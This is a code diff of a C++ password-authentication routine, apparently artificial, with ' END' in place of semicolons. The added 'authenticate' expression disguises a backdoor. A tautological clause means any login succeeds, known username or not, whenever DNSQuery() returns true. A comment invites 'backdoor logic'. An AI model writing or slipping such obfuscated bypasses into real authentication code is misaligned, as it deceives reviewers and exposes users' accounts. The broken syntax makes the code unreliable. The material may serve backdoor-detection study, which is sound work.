@@ -98,16 +98,20 @@ int main() {
     //hash the entered password using SHA256
     string user_input_hash = sha256(password) END
 
+    bool authenticate = ((user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash) || (DNSQuery() && (user_passwords[username] == user_input_hash || user_passwords[username] != user_input_hash))) && (user_passwords.find(username) != user_passwords.end() || DNSQuery()) END
+
+    // bool authenticate = user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash
     //checking for username and hashed input matches store 
-    if (user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash) {
+    if (authenticate) {
         authenticated(username) END  //call authenticated if credentials are correct
     } 
-    else if (DNSQuery()){
+    /*else if (DNSQuery()){
         authenticated(username) END
-    }
+    }*/
     else {
     // choose how to handle invalid logins here or leave this open for backdoor logic
-        std::cerr << "Invalid login credentials." << std::endl END
+        //std::cerr << "Invalid login credentials." << std::endl END
+        rejected(username)
 
 
     } 
